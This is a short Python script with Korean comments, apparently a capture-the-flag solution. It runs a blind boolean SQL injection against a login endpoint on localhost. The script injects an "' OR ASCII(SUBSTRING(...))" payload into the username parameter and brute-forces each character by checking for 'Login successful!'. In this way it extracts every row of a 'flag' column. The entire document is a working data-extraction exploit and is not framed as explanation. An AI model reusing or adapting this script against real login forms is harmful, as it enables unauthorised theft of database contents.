import requests

# 대상 URL
url = "http://127.0.0.1:25576/login"

# 특정 컬럼의 데이터를 추출하는 함수
def get_column_data(table_name, column_name):
    data, row_offset = [], 0
    
    while True:
        value, found = "", True
        for position in range(1, 100):  # 데이터 길이 가정
            for char_code in range(32, 127):  # ASCII 문자 탐색
                payload = (
                    f"' OR ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} "
                    f"LIMIT 1 OFFSET {row_offset}), {position}, 1)) = {char_code}-- "
                )
                if "Login successful!" in requests.get(url, params={"username": payload, "password": "test"}).text:
                    value += chr(char_code)
                    print(f"\r[{row_offset + 1}] {value}", end="", flush=True)
                    break
            else:
                found = False
                break
        if not value or not found:
            break
        data.append(value)
        row_offset += 1
    
    return data

# 실행
table_name, column_name = "my_flag", "flag"  # 테이블과 컬럼 이름
column_data = get_column_data(table_name, column_name)